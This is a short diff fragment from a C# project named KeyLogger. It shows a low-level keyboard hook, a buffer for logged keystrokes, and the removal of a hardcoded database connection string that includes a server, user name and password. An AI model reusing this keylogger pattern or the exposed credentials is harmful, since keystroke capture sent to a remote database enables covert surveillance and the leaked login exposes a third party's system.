@@ -18,7 +18,7 @@ namespace KeyLogger
         private static LowLevelKeyboardProc loggerProcedure = HookCallback; // Zavěšení callbacku na stisk klávesy
         
         private static StringBuilder loggedKeysString;
-        private static string connectionString = "server=db1.forsite.cz;database=vsb;uid=vsb;pwd=SnhIAIZ3;";
+        private static string connectionString = "";
        
         public Logger()
         {
